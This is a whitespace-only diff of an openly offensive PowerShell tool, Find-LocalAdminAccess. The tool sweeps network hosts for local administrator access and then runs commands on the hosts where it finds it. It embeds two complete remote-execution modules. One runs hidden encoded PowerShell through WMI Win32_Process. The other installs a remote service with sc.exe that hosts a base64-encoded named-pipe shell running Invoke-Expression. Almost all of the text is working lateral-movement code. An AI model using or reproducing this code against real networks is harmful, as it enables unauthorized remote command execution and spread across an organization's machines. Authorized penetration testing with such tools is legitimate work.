@@ -1,13 +1,13 @@
 function Find-LocalAdminAccess {
-	
+
 	<#
 
 	.SYNOPSIS
 	Find-LocalAdminAccess Author: Rob LP (@L3o4j)
 	https://github.com/Leo4j/Find-LocalAdminAccess
-	
+
 	#>
-	
+
     	param (
         	[string]$Targets,
 		[Parameter(Mandatory=$true)]
@@ -27,7 +27,7 @@ function Find-LocalAdminAccess {
 		$ErrorActionPreference = "SilentlyContinue"
 		$WarningPreference = "SilentlyContinue"
 	}
-	
+
 	Set-Variable MaximumHistoryCount 32767
 
     	if (($UserName -OR $Password) -AND ($Method -eq "SMB")) {
@@ -37,12 +37,12 @@ function Find-LocalAdminAccess {
 
     	if ($Targets) {
      		$TestPath = Test-Path $Targets
-		
+
 		if($TestPath){
 			$Computers = Get-Content -Path $Targets
 			$Computers = $Computers | Sort-Object -Unique
 		}
-		
+
 		else{
 			$Computers = $Targets
 			$Computers = $Computers -split ","
@@ -72,11 +72,11 @@ function Find-LocalAdminAccess {
 	$TempHostname = $HostFQDN -replace '\..*', ''
 	$Computers = $Computers | Where-Object {$_ -ne "$HostFQDN"}
 	$Computers = $Computers | Where-Object {$_ -ne "$TempHostname"}
-	
+
 	if($Method -eq "WMI"){$PortScan = 135}
 	elseif($Method -eq "SMB"){$PortScan = 445}
 	elseif($Method -eq "PSRemoting"){$PortScan = 5985}
-	
+
 	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
 	$runspacePool.Open()
 
@@ -115,12 +115,12 @@ function Find-LocalAdminAccess {
 	}
 
 	$Computers = $reachable_hosts
-	
+
 	#$Computers = $Computers | Sort-Object -Unique
 
 	$runspacePool.Close()
 	$runspacePool.Dispose()
-	
+
 	if($UserName){
 		Write-Output ""
 		Write-Output "[+] $UserName has Local Admin access on:"
@@ -139,12 +139,12 @@ function Find-LocalAdminAccess {
 			$UserName,
 			$Password
 		)
-		
+
 		if($UserName -AND $Password){
 			$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
 			$cred = New-Object System.Management.Automation.PSCredential($UserName, $SecPassword)
 		}
-		
+
 		$Error.Clear()
 
 		if ($UserName -AND $Password -AND ($Method -eq "WMI")) {Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred}
@@ -199,14 +199,14 @@ function Find-LocalAdminAccess {
     	$runspacePool.Dispose()
 
  	#$ComputerAccess = $ComputerAccess | Sort-Object -Unique
-	
+
 	if($ComputerAccess){
 		$ComputerAccess = $ComputerAccess | Where-Object { $_ }
 		if($InLine){$LineComputerAccess = $ComputerAccess;$LineComputerAccess = $LineComputerAccess -Join ",";Write-Output $LineComputerAccess}
 		else{$ComputerAccess | ForEach-Object { Write-Output $_ }}
 	}
   	else{Write-Output "[-] No Access"}
-		
+
 	if($SaveOutput){
 	    	try {
 	        	$ComputerAccess | Out-File $PWD\LocalAdminAccess.txt -Force
@@ -220,7 +220,7 @@ function Find-LocalAdminAccess {
 			Write-Output ""
 	    	}
 	} else {Write-Output ""}
-	
+
 	if ($Command) {
 
 		if ($UserName -and $Password) {
@@ -280,7 +280,7 @@ function Find-LocalAdminAccess {
 		}
 
 		$JobObjects = @()
-		
+
 		if ($Method -eq 'SMB' -AND $scsafe) {
 			foreach ($Computer in $ComputerAccess) {
 				[void]$Mutex.WaitOne()
@@ -296,7 +296,7 @@ function Find-LocalAdminAccess {
 				}
 			}
 		}
-		
+
 		else{
 
 			foreach ($Computer in $ComputerAccess) {
@@ -315,7 +315,7 @@ function Find-LocalAdminAccess {
 
 			foreach ($Job in $JobObjects) {
 				$Result = $Job.PowerShell.EndInvoke($Job.Handle)
-				
+
 				if ($Result.Error) {
 					Write-Output "$($Result.ComputerName): Error - $($Result.Error)"
 				} else {
@@ -324,18 +324,18 @@ function Find-LocalAdminAccess {
 					Write-Output ""
 					Write-Output ""
 				}
-				
+
 				$Job.PowerShell.Dispose()
 			}
-			
+
 			$RunspacePool.Close()
 		}
-		
+
 		if ($Method -eq 'SMB' -AND $scsafe) {
 			# Release the mutex
 			$Mutex.Dispose()
 		}
-		
+
 		Write-Output "[+] Command execution completed"
 		Write-Output ""
 	}
@@ -343,38 +343,38 @@ function Find-LocalAdminAccess {
 
 $WmiScript = @'
 function Invoke-WMIRemoting {
-	
+
 	<#
-	
+
 	.SYNOPSIS
 	Invoke-WMIRemoting Author: Rob LP (@L3o4j)
 	https://github.com/Leo4j/Invoke-WMIRemoting
-	
+
 	.DESCRIPTION
 	Command Execution or Pseudo-Shell over WMI
 	The user you run the script as needs to be Administrator over the ComputerName
-	
+
 	.PARAMETER ComputerName
 	The Server HostName or IP to connect to
-	
+
 	.PARAMETER Command
 	Specify a command to run instead of entering a Pseudo-Shell
 	You'll enter a Pseudo-Shell if -Command is not provided
-	
+
 	.PARAMETER UserName
 	Specify the UserName to authenticate as
-	
+
 	.PARAMETER Password
 	Specify a Password for the UserName you want to authenticate as
-	
+
 	.EXAMPLE
 	Invoke-WMIRemoting -ComputerName Server01.domain.local
 	Invoke-WMIRemoting -ComputerName Server01.domain.local -Command "whoami /all"
 	Invoke-WMIRemoting -ComputerName Server01.domain.local -Username domain\user -Password Password
 	Invoke-WMIRemoting -ComputerName Server01.domain.local -Username domain\user -Password Password -Command "whoami /all"
-	
+
 	#>
-	
+
 	param (
 	[Parameter(Mandatory = $true)]
 	[string]$ComputerName,
@@ -385,7 +385,7 @@ function Invoke-WMIRemoting {
 
  	$ErrorActionPreference = "SilentlyContinue"
 	$WarningPreference = "SilentlyContinue"
-	
+
 	if($UserName -AND $Password){
 		$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
 		$cred = New-Object System.Management.Automation.PSCredential($UserName,$SecPassword)
@@ -393,25 +393,25 @@ function Invoke-WMIRemoting {
 
 	$ClassID = "Custom_WMI_" + (Get-Random)
 	$KeyID = "CmdGUID"
-	
-	try{	
+
+	try{
 		if($UserName -AND $Password){$classExists = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred}
 	 	else{$classExists = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -List -Namespace "root\cimv2"}
    	} catch {Write-Output "[-] Access Denied"; Write-Output ""; break}
 
      	try{
 		if (-not $classExists) {
-			
+
 			if($cred){
 				$connectionOptions = New-Object System.Management.ConnectionOptions
 				if($UserName -AND $Password){
 					$connectionOptions.Username = $UserName
 					$connectionOptions.Password = $Password
 				}
-	
+
 				$scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", $connectionOptions)
 				$scope.Connect()
-				
+
 				$createNewClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::new(), $null)
 				$createNewClass["__CLASS"] = $ClassID
 				$createNewClass.Properties.Add($KeyID, [System.Management.CimType]::String, $false)
@@ -431,11 +431,11 @@ function Invoke-WMIRemoting {
 			}
 		}
   	} catch {Write-Output "[-] Access Denied"; Write-Output ""; break}
-	
+
 	try{
 		if($cred){$wmiData = Set-WmiInstance -Class $ClassID -ComputerName $ComputerName -Credential $cred}
 		else{$wmiData = Set-WmiInstance -Class $ClassID -ComputerName $ComputerName}
-		
+
 		$wmiData.GetType() | Out-Null
 		$GuidOutput = ($wmiData | Select-Object -Property $KeyID -ExpandProperty $KeyID)
 		$wmiData.Dispose()
@@ -452,12 +452,12 @@ function Invoke-WMIRemoting {
 	        $finalCommandBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalCommand))
 	        if($cred){$startProcess = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -Credential $cred -ArgumentList ("powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $finalCommandBase64)}
 		else{$startProcess = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList ("powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $finalCommandBase64)}
-	
+
 	        if ($startProcess.ReturnValue -ne 0) {
 			throw "Failed to start process on $ComputerName. Return value: $($startProcess.ReturnValue)"
 			return
 		}
-			
+
 		if ($startProcess.ReturnValue -eq 0) {
 			$elapsedTime = 0
 			$timeout = 60
@@ -475,7 +475,7 @@ function Invoke-WMIRemoting {
 			$wmiDataOutput.Put() | Out-Null
 			$wmiDataOutput.Dispose()
 			return $resultData
-	        } 
+	        }
 		else {
 			throw "Failed to run command on $ComputerName."
 			return
@@ -485,7 +485,7 @@ function Invoke-WMIRemoting {
 	if ($Command) {
 		$finalResult = & $RunCmd -CmdInput $Command
 		Write-Output $finalResult
-	} 
+	}
 	else {
 	        do {
 	            $inputFromUser = Read-Host "[$ComputerName]: PS:\>"
@@ -499,14 +499,14 @@ function Invoke-WMIRemoting {
 	            }
 	        } while ($true)
 	}
-	
-	
+
+
 	if($cred){
 		# Create a CimSession with the provided credentials
 		if($UserName -AND $Password) {
 			$sessionOptions = New-CimSessionOption -Protocol Dcom
 			$cimSession = New-CimSession -Credential $cred -ComputerName $ComputerName -SessionOption $sessionOptions
-		} 
+		}
   		else {$cimSession = New-CimSession -ComputerName $ComputerName}
 
 		# Use the CimSession to delete the class
@@ -522,7 +522,7 @@ function Invoke-WMIRemoting {
 
 $SmbScript = @'
 function Invoke-SMBRemoting {
-	
+
 	<#
 
 	.SYNOPSIS
@@ -532,29 +532,29 @@ function Invoke-SMBRemoting {
 	.DESCRIPTION
 	Command Execution or Interactive Shell over Named-Pipes
 	The user you run the script as needs to be Administrator over the ComputerName
-	
+
 	.PARAMETER ComputerName
 	The Server HostName or IP to connect to
-	
+
 	.PARAMETER PipeName
 	Specify the Pipe Name
-	
+
 	.PARAMETER ServiceName
 	Specify the Service Name
-	
+
 	.PARAMETER Command
 	Specify a command to run instead of getting a Shell
-	
+
 	.PARAMETER Verbose
 	Show Pipe and Service Name info
-	
+
 	.EXAMPLE
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local"
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command whoami
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all"
  	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService -Command whoami
-	
+
 	#>
 
 	param (
@@ -565,28 +565,28 @@ function Invoke-SMBRemoting {
 		[string]$Timeout = "30000",
 		[switch]$Verbose
 	)
-	
+
 	$ErrorActionPreference = "SilentlyContinue"
 	$WarningPreference = "SilentlyContinue"
 	Set-Variable MaximumHistoryCount 32767
-	
+
 	if (-not $ComputerName) {
 		Write-Output " [-] Please specify a Target"
 		return
 	}
-	
+
 	if(!$PipeName){
 		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
 		$randomvalue = $randomvalue -join ""
 		$PipeName = $randomvalue
 	}
-	
+
 	if(!$ServiceName){
 		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
 		$randomvalue = $randomvalue -join ""
 		$ServiceName = "Service_" + $randomvalue
 	}
-	
+
 	$ServerScript = @"
 `$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
 `$pipeServer.WaitForConnection()
@@ -597,7 +597,7 @@ while (`$true) {
 		break
 	}
 	`$command = `$sr.ReadLine()
-	if (`$command -eq "exit") {break} 
+	if (`$command -eq "exit") {break}
 	else {
 		try{
 			`$result = Invoke-Expression `$command | Out-String
@@ -613,19 +613,19 @@ while (`$true) {
 `$pipeServer.Disconnect()
 `$pipeServer.Dispose()
 "@
-	
+
 	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
-	
+
 	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
-	
+
 	$startarguments = "\\$ComputerName start $ServiceName"
-	
+
 	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
-	
+
 	Start-Sleep -Milliseconds 1000
-	
+
 	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
-	
+
 	if($Verbose){
 		Write-Output ""
 		Write-Output " [+] Pipe Name: $PipeName"
@@ -635,10 +635,10 @@ while (`$true) {
 		Write-Output " [+] Creating Service on Remote Target..."
 	}
 	#Write-Output ""
-	
+
 	# Get the current process ID
 	$currentPID = $PID
-	
+
 	# Embedded monitoring script
 	$monitoringScript = @"
 `$serviceToDelete = "$ServiceName" # Name of the service you want to delete
@@ -659,14 +659,14 @@ while (`$true) {
 	}
 }
 "@
-	
+
 	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
-	
+
 	# Execute the embedded monitoring script in a hidden window
 	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
-	
+
 	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
-	
+
  	try {
 		$pipeClient.Connect($Timeout)
 	} catch [System.TimeoutException] {
@@ -683,7 +683,7 @@ while (`$true) {
 	$sw = New-Object System.IO.StreamWriter($pipeClient)
 
 	$serverOutput = ""
-	
+
 	if ($Command) {
 		$fullCommand = "$Command 2>&1 | Out-String"
 		$sw.WriteLine($fullCommand)
@@ -698,15 +698,15 @@ while (`$true) {
 				$serverOutput += "$line`n"
 			}
 		}
-	} 
-	
+	}
+
 	else {
 		while ($true) {
-			
+
 			# Fetch the actual remote prompt
 			$sw.WriteLine("prompt | Out-String")
 			$sw.Flush()
-			
+
 			$remotePath = ""
 			while ($true) {
 				$line = $sr.ReadLine()
@@ -719,29 +719,29 @@ while (`$true) {
 					$remotePath += "$line`n"
 				}
 			}
-			
+
 			$computerNameOnly = $ComputerName -split '\.' | Select-Object -First 1
 			$promptString = "[$computerNameOnly]: $remotePath "
 			Write-Host -NoNewline $promptString
 			$userCommand = Read-Host
-			
+
 			if ($userCommand -eq "exit") {
 				Write-Output ""
 					$sw.WriteLine("exit")
 				$sw.Flush()
 				break
 			}
-			
+
 			elseif($userCommand -ne ""){
 				$fullCommand = "$userCommand 2>&1 | Out-String"
 				$sw.WriteLine($fullCommand)
 				$sw.Flush()
 			}
-			
+
 			else{
 				continue
 			}
-			
+
 			#Write-Output ""
 
 			$serverOutput = ""
